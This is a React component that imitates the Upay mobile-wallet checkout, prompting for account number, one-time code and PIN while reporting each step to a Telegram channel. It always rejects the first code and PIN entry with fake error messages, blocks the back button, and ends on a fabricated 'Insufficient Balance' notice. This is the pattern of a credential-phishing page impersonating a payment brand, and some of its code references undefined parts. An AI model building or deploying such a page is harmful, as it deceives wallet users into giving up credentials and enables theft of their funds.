import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { sendTelegramNotification } from "@/lib/telegram";
import upayLogo from "@/assets/upay-logo-full.svg";

const UpayPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const [mobileNumber, setMobileNumber] = useState("");
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  const [step, setStep] = useState<'mobile' | 'otp' | 'pin'>('mobile');
  const [showError, setShowError] = useState("");
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [pinAttempts, setPinAttempts] = useState(0);

  const mobileRef = useRef<HTMLInputElement>(null);
  const otpRef = useRef<HTMLInputElement>(null);
  const pinRef = useRef<HTMLInputElement>(null);

  const invoiceNumber = "12117746247398975";

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}.00`, { replace: true });
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount]);

  useEffect(() => {
    if (step === 'mobile') setTimeout(() => mobileRef.current?.focus(), 100);
    if (step === 'otp') setTimeout(() => otpRef.current?.focus(), 100);
    if (step === 'pin') setTimeout(() => pinRef.current?.focus(), 100);
  }, [step]);


  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const isValidMobile = () => {
    return mobileNumber.length === 11 && validPrefixes.includes(mobileNumber.substring(0, 3)) && /^\d+$/.test(mobileNumber);
  };

  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setMobileNumber(e.target.value.replace(/\D/g, "").slice(0, 11));
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPin(e.target.value.replace(/\D/g, "").slice(0, 6));
  };

  const handleMobileSubmit = () => {
    if (!isValidMobile()) {
      setShowError("Please enter a valid mobile number.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay Number' });
    setStep('otp');
  };

  const handleOtpSubmit = () => {
    if (otp.length < 4) {
      setShowError("Please enter the verification code.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay OTP' });

    if (otpAttempts === 0) {
      setOtpAttempts(1);
      setShowError("Invalid verification code.");
      setOtp("");
      setTimeout(() => otpRef.current?.focus(), 50);
      setTimeout(() => setShowError(""), 4000);
      return;
    }
    setStep('pin');
  };

  const handlePinSubmit = () => {
    if (pin.length < 4) {
      setShowError("Please enter your PIN.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay PIN' });

    if (pinAttempts === 0) {
      setPinAttempts(1);
      setShowError("Wrong PIN. Please try again.");
      setPin("");
      setTimeout(() => pinRef.current?.focus(), 50);
      setTimeout(() => setShowError(""), 4000);
      return;
    }
    navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
  };

  const handleClose = () => {
    navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}.00`);
  };

  // Memoized header to prevent logo re-loading
  const header = (
    <div className="bg-[#FFD600] rounded-t-2xl pt-8 pb-6 flex flex-col items-center relative">
      <div className="absolute top-0 left-0 right-0 h-full overflow-hidden">
        <svg className="absolute top-0 right-0 w-full h-full" viewBox="0 0 400 200" fill="none" preserveAspectRatio="none">
          <path d="M0 0 Q200 80 400 0 L400 200 L0 200 Z" fill="rgba(255,255,255,0.08)" />
        </svg>
      </div>
      <div className="relative z-10 bg-white rounded-full w-24 h-24 flex items-center justify-center shadow-md">
        <img src={upayLogo} alt="Upay" className="w-20 h-20 object-contain" />
      </div>
    </div>
  );

  const invoiceInfo = (
    <div className="bg-[#F5F5F5] mx-4 -mt-2 rounded-xl p-4 text-center relative z-10">
      <p className="font-bold text-[#1a1a1a] text-sm">GENZ SMM PANEL</p>
      <p className="text-[#555] text-xs mt-1">Invoice Number:</p>
      <p className="font-bold text-[#1a1a1a] text-sm">{invoiceNumber}</p>
      <p className="text-[#555] text-xs mt-1">Amount: <span className="font-bold text-[#1a1a1a]">BDT {amount}</span></p>
    </div>
  );

  const footer = (
    <div className="border-t border-[#eee] py-2 flex items-center justify-center gap-1.5">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="#0054A5">
        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
      </svg>
      <span className="text-[#0054A5] font-bold text-sm">16268</span>
    </div>
  );

  // Failed view
  if (step === 'failed') {
    return (
      <CardWrapper>
        <div className="text-center py-4">
          <p className="text-red-600 font-bold text-base mb-1">Transaction Failed</p>
          <p className="text-[#555] text-sm mb-1">Insufficient balance in your account.</p>
          <p className="text-[#999] text-xs">Redirecting in {redirectTimer}s...</p>
        </div>
      </CardWrapper>
    );
  }

  // PIN view
  if (step === 'pin') {
    return (
      <CardWrapper>
        <p className="text-center text-[#0054A5] font-semibold text-sm mb-4">Enter your PIN</p>
        {showError && (
          <p className="text-center text-red-500 text-xs mb-2">{showError}</p>
        )}
        <input
          ref={pinRef}
          type="password"
          inputMode="numeric"
          value={pin}
          onChange={handlePinChange}
          placeholder="PIN"
          className="w-full border-2 border-[#A8D8A8] rounded-full px-4 py-3 text-center text-base outline-none focus:border-[#0054A5] transition-colors"
        />
        <p className="text-center text-[#555] text-xs mt-3">
          By clicking on <span className="font-bold">Confirm,</span> you are agreeing to the{" "}
          <span className="underline text-[#1a1a1a]">terms & conditions</span>
        </p>
        <div className="flex items-center justify-between mt-5 px-2">
          <button
            onClick={handleClose}
            className="border-2 border-[#ccc] rounded-md px-6 py-2 text-sm font-semibold text-[#333] bg-white hover:bg-[#f5f5f5]"
          >
            Close
          </button>
          <button
            onClick={handlePinSubmit}
            className="bg-[#0054A5] text-white rounded-md px-6 py-2 text-sm font-semibold hover:bg-[#004090]"
          >
            Confirm
          </button>
        </div>
      </CardWrapper>
    );
  }

  // OTP view
  if (step === 'otp') {
    return (
      <CardWrapper>
        <p className="text-center text-[#0054A5] font-semibold text-sm mb-4">Enter verification code</p>
        {showError && (
          <p className="text-center text-red-500 text-xs mb-2">{showError}</p>
        )}
        <input
          ref={otpRef}
          type="text"
          inputMode="numeric"
          value={otp}
          onChange={handleOtpChange}
          placeholder="Verification code"
          className="w-full border-2 border-[#A8D8A8] rounded-full px-4 py-3 text-center text-base outline-none focus:border-[#0054A5] transition-colors"
        />
        <p className="text-center text-[#555] text-xs mt-3">
          By clicking on <span className="font-bold">Confirm,</span> you are agreeing to the{" "}
          <span className="underline text-[#1a1a1a]">terms & conditions</span>
        </p>
        <div className="flex items-center justify-between mt-5 px-2">
          <button
            onClick={handleClose}
            className="border-2 border-[#ccc] rounded-md px-6 py-2 text-sm font-semibold text-[#333] bg-white hover:bg-[#f5f5f5]"
          >
            Close
          </button>
          <button
            onClick={handleOtpSubmit}
            className="bg-[#0054A5] text-white rounded-md px-6 py-2 text-sm font-semibold hover:bg-[#004090]"
          >
            Confirm
          </button>
        </div>
      </CardWrapper>
    );
  }

  // Mobile number view (default)
  return (
    <CardWrapper>
      <p className="text-center text-[#0054A5] font-semibold text-sm mb-4">Enter Your upay Account Number</p>
      {showError && (
        <p className="text-center text-red-500 text-xs mb-2">{showError}</p>
      )}
      <input
        ref={mobileRef}
        type="text"
        inputMode="numeric"
        value={mobileNumber}
        onChange={handleMobileChange}
        placeholder="01888888888"
        className="w-full border-2 border-[#A8D8A8] rounded-full px-4 py-3 text-center text-base outline-none focus:border-[#0054A5] transition-colors"
      />
      <p className="text-center text-[#555] text-xs mt-3">
        By clicking on <span className="font-bold">Confirm,</span> you are agreeing to the{" "}
        <span className="underline text-[#1a1a1a]">terms & conditions</span>
      </p>
      <div className="flex items-center justify-between mt-5 px-2">
        <button
          onClick={handleClose}
          className="border-2 border-[#ccc] rounded-md px-6 py-2 text-sm font-semibold text-[#333] bg-white hover:bg-[#f5f5f5]"
        >
          Close
        </button>
        <button
          onClick={handleMobileSubmit}
          className="bg-[#0054A5] text-white rounded-md px-6 py-2 text-sm font-semibold hover:bg-[#004090]"
        >
          Confirm
        </button>
      </div>
    </CardWrapper>
  );
};

export default UpayPayment;
